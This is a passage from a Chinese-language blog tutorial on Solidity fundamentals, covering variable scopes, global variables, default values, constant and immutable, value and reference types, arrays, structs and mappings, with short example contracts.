//在函数中定义的变量只有在调用这个函数的时候才会在虚拟机中产生</span><br><span class="line">        //在函数内部的变量叫局部变量</span><br><span class="line">        state1=789;</span><br><span class="line">        addr=address(1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码部署之后可以看到一个函数和部分值的初始值</p><p><img src="/image/media/2022/Solidity/img/4.png"></p><p>点击黄色的函数名称按钮代表写入方法，会改变链的状态</p><p><img src="/image/media/2022/Solidity/img/5.png"></p><p>可以看到载入方法之后，状态变量的值发生变化，局部变量不会有变化而且不会产生数据</p><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>全局变量是全局范围工作的变量，都是solidity预留关键字。不用定义就能显示内容的变量。他们可以在函数内不声明直接使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract Variables &#123;</span><br><span class="line">    function global() external view returns(address,uint, uint, bytes memory)&#123;</span><br><span class="line">        address sender = msg.sender;//账户内容，上一个调用这个函数的地址，可能是人或合约</span><br><span class="line">        uint timestamp= block.timestamp;//当前时间时间戳</span><br><span class="line">        uint blockNum = block.number;//当前区块编号</span><br><span class="line">        bytes memory data = msg.data;</span><br><span class="line">        return(sender,timestamp, blockNum, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存部署之后点击按钮即可查看全局变量的值</p><p><img src="/image/media/2022/Solidity/img/6.png"></p><p>在上面例子里，我们使用了3个常用的全局变量：<code>msg.sender</code>, <code>block.number</code>和<code>msg.data</code>，他们分别代表请求发起地址，当前区块高度，和请求数据。下面是一些常用的全局变量，更完整的列表请看这个<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">链接</a>：</p><ul><li><code>blockhash(uint blockNumber)</code>: (<code>bytes32</code>)给定区块的哈希值 – 只适用于256最近区块, 不包含当前区块。</li><li><code>block.coinbase</code>: (<code>address payable</code>) 当前区块矿工的地址</li><li><code>block.gaslimit</code>: (<code>uint</code>) 当前区块的gaslimit</li><li><code>block.number</code>: (<code>uint</code>) 当前区块的number</li><li><code>block.timestamp</code>: (<code>uint</code>) 当前区块的时间戳，为unix纪元以来的秒</li><li><code>gasleft()</code>: (<code>uint256</code>) 剩余 gas</li><li><code>msg.data</code>: (<code>bytes calldata</code>) 完整call data</li><li><code>msg.sender</code>: (<code>address payable</code>) 消息发送者 (当前 caller)</li><li><code>msg.sig</code>: (<code>bytes4</code>) calldata的前四个字节 (function identifier)</li><li><code>msg.value</code>: (<code>uint</code>) 当前交易发送的<code>wei</code>值</li></ul><h3 id="变量初始值"><a href="#变量初始值" class="headerlink" title="变量初始值"></a>变量初始值</h3><p>在<code>solidity</code>中，声明但没赋值的变量都有它的初始值或默认值。</p><h4 id="值类型初始值"><a href="#值类型初始值" class="headerlink" title="值类型初始值"></a>值类型初始值</h4><ul><li><p><code>boolean</code>: <code>false</code></p></li><li><p><code>string</code>: <code>&quot;&quot;</code></p></li><li><p><code>int</code>: <code>0</code></p></li><li><p><code>uint</code>: <code>0</code></p></li><li><p><code>enum</code>: 枚举中的第一个元素</p></li><li><p><code>address</code>: <code>0x0000000000000000000000000000000000000000</code> (或 <code>address(0)</code>)</p></li><li><p>```<br>function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - `internal`: 空白方程</span><br><span class="line">  - `external`: 空白方程</span><br><span class="line"></span><br><span class="line">可以用`public`变量的`getter`函数验证上面写的初始值是否正确：</span><br><span class="line"></span><br><span class="line">```solidity</span><br><span class="line">    bool public _bool; // false</span><br><span class="line">    string public _string; // &quot;&quot;</span><br><span class="line">    int public _int; // 0</span><br><span class="line">    uint public _uint; // 0</span><br><span class="line">    address public _address; // 0x0000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">    enum ActionSet &#123; Buy, Hold, Sell&#125;</span><br><span class="line">    ActionSet public _enum; // 第一个元素 0</span><br><span class="line"></span><br><span class="line">    function fi() internal&#123;&#125; // internal空白方程 </span><br><span class="line">    function fe() external&#123;&#125; // external空白方程 </span><br></pre></td></tr></table></figure></li></ul><h4 id="引用类型初始值"><a href="#引用类型初始值" class="headerlink" title="引用类型初始值"></a>引用类型初始值</h4><ul><li>映射<code>mapping</code>: 所有元素都为其默认值的<code>mapping</code></li><li>结构体<code>struct</code>: 所有成员设为其默认值的结构体</li><li>数组<code>array</code><ul><li>动态数组: <code>[]</code></li><li>静态数组（定长）: 所有成员设为其默认值的静态数组</li></ul></li></ul><p>可以用<code>public</code>变量的<code>getter</code>函数验证上面写的初始值是否正确：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Reference Types</span><br><span class="line">uint[8] public _staticArray; // 所有成员设为其默认值的静态数组[0,0,0,0,0,0,0,0]</span><br><span class="line">uint[] public _dynamicArray; // `[]`</span><br><span class="line">mapping(uint =&gt; address) public _mapping; // 所有元素都为其默认值的mapping</span><br><span class="line">// 所有成员设为其默认值的结构体 0, 0</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line">Student public student;</span><br></pre></td></tr></table></figure><h4 id="delete操作符"><a href="#delete操作符" class="headerlink" title="delete操作符"></a><code>delete</code>操作符</h4><p><code>delete a</code>会让变量<code>a</code>的值变为初始值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// delete操作符</span><br><span class="line">bool public _bool2 = true; </span><br><span class="line">function d() external &#123;</span><br><span class="line">    delete _bool2; // delete 会让_bool2变为默认值，false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量被声明但没有赋值的时候，它的值默认为初始值。不同类型的变量初始值不同，<code>delete</code>操作符可以删除一个变量的值并代替为初始值。</p><h3 id="常数"><a href="#常数" class="headerlink" title="常数"></a>常数</h3><p><code>solidity</code>中两个关键字，<code>constant</code>（常量）和<code>immutable</code>（不变量）。状态变量声明这个两个关键字之后，不能在合约后更改数值；并且还可以节省<code>gas</code>。另外，只有数值变量可以声明<code>constant</code>和<code>immutable</code>；<code>string</code>和<code>bytes</code>可以声明为<code>constant</code>，但不能为<code>immutable</code>。让不应该变的变量保持不变。这样的做法能在节省<code>gas</code>的同时提升合约的安全性。</p><h4 id="常量（constant）"><a href="#常量（constant）" class="headerlink" title="常量（constant）"></a>常量（constant）</h4><p><code>constant</code>变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// constant变量必须在声明的时候初始化，之后不能改变</span><br><span class="line">uint256 constant CONSTANT_NUM = 10;</span><br><span class="line">string constant CONSTANT_STRING = &quot;0xAA&quot;;</span><br><span class="line">bytes constant CONSTANT_BYTES = &quot;WTF&quot;;</span><br><span class="line">address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;</span><br></pre></td></tr></table></figure><h4 id="不变量（immutable）"><a href="#不变量（immutable）" class="headerlink" title="不变量（immutable）"></a>不变量（immutable）</h4><p><code>immutable</code>变量可以在声明时或构造函数中初始化，因此更加灵活。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// immutable变量可以在constructor里初始化，之后不能改变</span><br><span class="line">uint256 public immutable IMMUTABLE_NUM = 9999999999;</span><br><span class="line">address public immutable IMMUTABLE_ADDRESS;</span><br><span class="line">uint256 public immutable IMMUTABLE_BLOCK;</span><br><span class="line">uint256 public immutable IMMUTABLE_TEST;</span><br></pre></td></tr></table></figure><p>你可以使用全局变量例如<code>address(this)</code>，<code>block.number</code> ，或者自定义的函数给<code>immutable</code>变量初始化。在下面这个例子，我们利用了<code>test()</code>函数给<code>IMMUTABLE_TEST</code>初始化为<code>9</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 利用constructor初始化immutable变量，因此可以利用</span><br><span class="line">constructor()&#123;</span><br><span class="line">    IMMUTABLE_ADDRESS = address(this);</span><br><span class="line">    IMMUTABLE_BLOCK = block.number;</span><br><span class="line">    IMMUTABLE_TEST = test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test() public pure returns(uint256)&#123;</span><br><span class="line">    uint256 what = 9;</span><br><span class="line">    return(what);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>要求实现计数器的智能合约，对状态变量加或者减操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract Counter &#123;</span><br><span class="line">    uint public count;</span><br><span class="line">    function inc() external &#123;</span><br><span class="line">        count +=1;</span><br><span class="line">    &#125;</span><br><span class="line">    function dec() external &#123;</span><br><span class="line">        count -=1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译部署之后可以看到两个橙色按钮，点击即可实现对count数值变化</p><p><img src="/image/media/2022/Solidity/img/7.png"></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="Solidity中的变量类型"><a href="#Solidity中的变量类型" class="headerlink" title="Solidity中的变量类型"></a>Solidity中的变量类型</h3><ul><li><p>数值类型(Value Type)：包括布尔型，整数型等等，这类变量赋值时候直接传递数值。</p></li><li><p>引用类型(Reference Type)：包括数组和结构体，这类变量占空间大，赋值时候直接传递地址（类似指针）。</p></li><li><p>映射类型(Mapping Type): Solidity里的哈希表。</p></li><li><p>函数类型(Function Type)：Solidity文档里把函数归到数值类型，但我觉得他跟其他类型差别很大，所以单独分一类。</p></li></ul><h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><h4 id="布尔型（bool）"><a href="#布尔型（bool）" class="headerlink" title="布尔型（bool）"></a>布尔型（bool）</h4><p>布尔型是二值变量，取值为true或false。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 布尔值</span><br><span class="line">bool public _bool = true;</span><br></pre></td></tr></table></figure><p>布尔值的运算符，包括：</p><ul><li>! （逻辑非）</li><li>&amp;&amp; （逻辑与， “and” ）</li><li>|| （逻辑或， “or” ）</li><li>== （等于）</li><li>!= （不等于）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 布尔运算</span><br><span class="line">bool public _bool1 = !_bool; //取非</span><br><span class="line">bool public _bool2 = _bool &amp;&amp; _bool1; //与</span><br><span class="line">bool public _bool3 = _bool || _bool1; //或</span><br><span class="line">bool public _bool4 = _bool == _bool1; //相等</span><br><span class="line">bool public _bool5 = _bool != _bool1; //不相等</span><br></pre></td></tr></table></figure><p>上面的代码中：变量<code>_bool</code>的取值是<code>true</code>；<code>_bool1</code>是<code>_bool</code>的非，为<code>false</code>；<code>_bool &amp;&amp; _bool1</code>为<code>false</code>；<code>_bool || _bool1</code>为<code>true</code>；<code>_bool == _bool1</code>为<code>false</code>；<code>_bool != _bool1</code>为<code>true</code>。 </p><p><strong>值得注意的是：</strong><code>&amp;&amp;</code> 和 <code>||</code>运算符遵循短路规则，这意味着，假如存在<code>f(x) || g(y)</code>的表达式，如果<code>f(x)</code>是<code>true</code>，<code>g(y)</code>不会被计算，即使它和<code>f(x)</code>的结果是相反的</p><h4 id="整型（int）"><a href="#整型（int）" class="headerlink" title="整型（int）"></a>整型（int）</h4><p>整型是solidity中的整数，最常用的包括</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 整型</span><br><span class="line">int public _int = -1; // 整数，包括负数</span><br><span class="line">uint public _uint = 1; // 正整数</span><br><span class="line">uint256 public _number = 20220330; // 256位正整数</span><br></pre></td></tr></table></figure><p>常用的整型运算符包括：</p><ul><li>比较运算符（返回布尔值）： <code>&lt;=</code>， <code>&lt;</code>， <code>==</code>， <code>!=</code>， <code>&gt;=</code>， <code>&gt;</code></li><li>算数运算符： <code>+</code>， <code>-</code>， 一元运算 <code>-</code>， <code>+</code>， <code>*</code>， <code>/</code>， <code>%</code>（取余），<code>**</code>（幂）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 整数运算</span><br><span class="line">uint256 public _number1 = _number + 1; // +，-，*，/</span><br><span class="line">uint256 public _number2 = 2**2; // 指数</span><br><span class="line">uint256 public _number3 = 7 % 2; // 取余数</span><br><span class="line">bool public _numberbool = _number2 &gt; _number3; // 比大小</span><br></pre></td></tr></table></figure><h4 id="地址类型（address）"><a href="#地址类型（address）" class="headerlink" title="地址类型（address）"></a>地址类型（address）</h4><p>地址类型(address)存储一个 20 字节的值（以太坊地址的大小）。地址类型也有成员变量，并作为所有合约的基础。有普通的地址和可以转账ETH的地址（payable）。payable的地址拥有balance和transfer()两个成员，方便查询ETH余额以及转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 地址</span><br><span class="line">address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;</span><br><span class="line">address payable public _address1 = payable(_address); // payable address，可以转账、查余额</span><br><span class="line">// 地址类型的成员</span><br><span class="line">uint256 public balance = _address1.balance; // balance of address</span><br></pre></td></tr></table></figure><h4 id="定长字节数组（bytes）"><a href="#定长字节数组（bytes）" class="headerlink" title="定长字节数组（bytes）"></a>定长字节数组（bytes）</h4><p>字节数组bytes分两种，一种定长（byte, bytes8, bytes32），另一种不定长。定长的属于数值类型，不定长的是引用类型（之后讲）。 定长bytes可以存一些数据，消耗gas比较少。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 固定长度的字节数组</span><br><span class="line">bytes32 public _byte32 = &quot;MiniSolidity&quot;; </span><br><span class="line">bytes1 public _byte = _byte32[0]; </span><br><span class="line">//_byte变量存储_byte32的第一个字节，为0x4d。</span><br></pre></td></tr></table></figure><p>MiniSolidity变量以字节的方式存储进变量_byte32，转换成16进制为：0x4d696e69536f6c69646974790000000000000000000000000000000000000000</p><h4 id="枚举-（enum）"><a href="#枚举-（enum）" class="headerlink" title="枚举 （enum）"></a>枚举 （enum）</h4><p>枚举（enum）是solidity中用户定义的数据类型。它主要用于为uint分配名称，使程序易于阅读和维护。它与C语言中的enum类似，使用名称来代替从0开始的uint：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 用enum将uint 0， 1， 2表示为Buy, Hold, Sell</span><br><span class="line">enum ActionSet &#123; Buy, Hold, Sell &#125;</span><br><span class="line">// 创建enum变量 action</span><br><span class="line">ActionSet action = ActionSet.Buy;</span><br></pre></td></tr></table></figure><p>它可以显式的和<code>uint</code>相互转换，并会检查转换的正整数是否在枚举的长度内，不然会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// enum可以和uint显式的转换</span><br><span class="line">function enumToUint() external view returns(uint)&#123;</span><br><span class="line">return uint(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>enum的一个比较冷门的变量，几乎没什么人用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity ^0.8.7;</span><br><span class="line">contract ValueType&#123;</span><br><span class="line">    bool public b = true;  //公开可见的bool值,变量名为b,值为true或者false</span><br><span class="line">    </span><br><span class="line">    uint public u = 123;   //无符号整数,正整数,默认为uint256,值为0到2**256-1;</span><br><span class="line">                           //uint8,值为0到2**8-1;</span><br><span class="line">                           //uint16,值为0到2**16-1;除此之外uint32,uint40,unint48,往下面+8都有的</span><br><span class="line">                           </span><br><span class="line">    int public i =-123;    //正负数都可以表示，默认为int256,值为-2**255到2**255-1</span><br><span class="line">                                                //uint8,值为-2**7到2**7-1;   </span><br><span class="line">                                                </span><br><span class="line">    //（为什么是255，如果是256将会翻倍，所有这样的话int和uint在内存中的空间其实一样大）</span><br><span class="line">    </span><br><span class="line">    int public minint=type(int).min;  //查看有符号的整数的最小值</span><br><span class="line">    int public maxint=type(int).max;  //查看有符号的整数的最大值</span><br><span class="line">    //有符号的整数会落在上面这个区间之间</span><br><span class="line"></span><br><span class="line">    address public addr=0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;</span><br><span class="line">    //地址类型//16进制数值，比较短，可以算出来</span><br><span class="line"></span><br><span class="line">    bytes32 public b32=0x33cc998f29bb694187d0944de3a196c7360d1f3af801da895a9b1fd54877b729;</span><br><span class="line">    //比特</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><p>**引用类型(Reference Type)**：包括数组（<code>array</code>），结构体（<code>struct</code>）和映射（<code>mapping</code>），这类变量占空间大，赋值时候直接传递地址（类似指针）。由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。</p><h4 id="数组-array"><a href="#数组-array" class="headerlink" title="数组 array"></a>数组 array</h4><p>数组（<code>Array</code>）是<code>solidity</code>常用的一种变量类型，用来存储一组数据（整数，字节，地址等等）。数组分为固定长度数组和可变长度数组两种：</p><ul><li>固定长度数组：在声明时指定数组的长度。用<code>T[k]</code>的格式声明，其中<code>T</code>是元素的类型，<code>k</code>是长度，例如：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 固定长度 Array</span><br><span class="line">uint[8] array1;</span><br><span class="line">bytes1[5] array2;</span><br><span class="line">address[100] array3;</span><br></pre></td></tr></table></figure><ul><li>可变长度数组（动态数组）：在声明时不指定数组的长度。用<code>T[]</code>的格式声明，其中<code>T</code>是元素的类型，例如（<code>bytes</code>比较特殊，是数组，但是不用加<code>[]</code>）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 可变长度 Array</span><br><span class="line">uint[] array4;</span><br><span class="line">bytes1[] array5;</span><br><span class="line">address[] array6;</span><br><span class="line">bytes array7;</span><br></pre></td></tr></table></figure><h5 id="创建数组的规则"><a href="#创建数组的规则" class="headerlink" title="创建数组的规则"></a>创建数组的规则</h5><p>在solidity里，创建数组有一些规则：</p><ul><li>对于<code>memory</code>修饰的<code>动态数组</code>，可以用<code>new</code>操作符来创建，但是必须声明长度，并且声明后长度不能改变。例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// memory动态数组</span><br><span class="line">uint[] memory array8 = new uint[](5);</span><br><span class="line">bytes memory array9 = new bytes(9);</span><br></pre></td></tr></table></figure><ul><li>数组字面常数(Array Literals)是写作表达式形式的数组，用方括号包着来初始化array的一种方式，并且里面每一个元素的type是以第一个元素为准的，例如<code>[1,2,3]</code>里面所有的元素都是uint8类型，因为在solidity中如果一个值没有指定type的话，默认就是最小单位的该type，这里int的默认最小单位类型就是uint8。而<code>[uint(1),2,3]</code>里面的元素都是uint类型，因为第一个元素指定了是uint类型了，我们都以第一个元素为准。下面的合约中，对于f函数里面的调用，如果我们没有显式对第一个元素进行uint强转的话，是会报错的，因为如上所述我们其实是传入了uint8类型的array，可是g函数需要的却是uint类型的array，就会报错了。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line">contract C &#123;</span><br><span class="line">    function f() public pure &#123;</span><br><span class="line">        g([uint(1), 2, 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    function g(uint[3] memory) public pure &#123;</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果创建的是动态数组，你需要一个一个元素的赋值。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint[] memory x = new uint[](3);</span><br><span class="line">x[0] = 1;</span><br><span class="line">x[1] = 3;</span><br><span class="line">x[2] = 4;</span><br></pre></td></tr></table></figure><h5 id="数组成员"><a href="#数组成员" class="headerlink" title="数组成员"></a>数组成员</h5><ul><li><code>length</code>: 数组有一个包含元素数量的<code>length</code>成员，<code>memory</code>数组的长度在创建后是固定的。</li><li><code>push()</code>: <code>动态数组</code>和<code>bytes</code>拥有<code>push()</code>成员，可以在数组最后添加一个<code>0</code>元素。</li><li><code>push(x)</code>: <code>动态数组</code>和<code>bytes</code>拥有<code>push(x)</code>成员，可以在数组最后添加一个<code>x</code>元素。</li><li><code>pop()</code>: <code>动态数组</code>和<code>bytes</code>拥有<code>pop()</code>成员，可以移除数组最后一个元素。</li></ul><h4 id="结构体-struct"><a href="#结构体-struct" class="headerlink" title="结构体 struct"></a>结构体 struct</h4><p><code>olidity</code>支持通过构造结构体的形式定义新的类型。创建结构体的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 结构体</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Student student; // 初始一个student结构体</span><br></pre></td></tr></table></figure><p>给结构体赋值的两种方法：</p><ul><li>方法1:在函数中创建一个storage的struct引用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//  给结构体赋值</span><br><span class="line">// 方法1:在函数中创建一个storage的struct引用</span><br><span class="line">function initStudent1() external&#123;</span><br><span class="line">    Student storage _student = student; // assign a copy of student</span><br><span class="line">    _student.id = 11;</span><br><span class="line">    _student.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>方法2:直接引用状态变量的struct</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> // 方法2:直接引用状态变量的struct</span><br><span class="line">function initStudent2() external&#123;</span><br><span class="line">    student.id = 1;</span><br><span class="line">    student.score = 80;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="映射类型"><a href="#映射类型" class="headerlink" title="映射类型"></a>映射类型</h3><h4 id="映射Mapping"><a href="#映射Mapping" class="headerlink" title="映射Mapping"></a>映射Mapping</h4><p>在映射中，人们可以通过键（<code>Key</code>）来查询对应的值（<code>Value</code>），比如：通过一个人的<code>id</code>来查询他的钱包地址。</p><p>声明映射的格式为<code>mapping(_KeyType =&gt; _ValueType)</code>，其中<code>_KeyType</code>和<code>_ValueType</code>分别是<code>Key</code>和<code>Value</code>的变量类型。例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br></pre></td></tr></table></figure><h4 id="映射的规则"><a href="#映射的规则" class="headerlink" title="映射的规则"></a>映射的规则</h4><ul><li><strong>规则1</strong>：映射的<code>_KeyType</code>只能选择<code>solidity</code>默认的类型，比如<code>uint</code>，<code>address</code>等，不能用自定义的结构体。而<code>_ValueType</code>可以使用自定义的类型。下面这个例子会报错，因为<code>_KeyType</code>使用了我们自定义的结构体：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 我们定义一个结构体 Struct</span><br><span class="line">struct Student&#123;</span><br><span class="line">    uint256 id;</span><br><span class="line">    uint256 score; </span><br><span class="line">&#125;</span><br><span class="line"> mapping(Student =&gt; uint) public testVar;</span><br></pre></td></tr></table></figure><ul><li><strong>规则2</strong>：映射的存储位置必须是<code>storage</code>，因此可以用于合约的状态变量，函数中的<code>storage</code>变量，和library函数的参数（见<a href="https://github.com/ethereum/solidity/issues/4635">例子</a>）。不能用于<code>public</code>函数的参数或返回结果中，因为<code>mapping</code>记录的是一种关系 (key - value pair)。</li><li><strong>规则3</strong>：如果映射声明为<code>public</code>，那么<code>solidity</code>会自动给你创建一个<code>getter</code>函数，可以通过<code>Key</code>来查询对应的<code>Value</code>。</li><li><strong>规则4</strong>：给映射新增的键值对的语法为<code>_Var[_Key] = _Value</code>，其中<code>_Var</code>是映射变量名，<code>_Key</code>和<code>_Value</code>对应新增的键值对。例子：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function writeMap (uint _Key, address _Value) public&#123;</span><br><span class="line">    idToAddress[_Key] = _Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="映射的原理"><a href="#映射的原理" class="headerlink" title="映射的原理"></a>映射的原理</h4><ul><li><strong>原理1</strong>: 映射不储存任何键（<code>Key</code>）的资讯，也没有length的资讯。</li><li><strong>原理2</strong>: 映射使用<code>keccak256(key)</code>当成offset存取value。</li><li><strong>原理3</strong>: 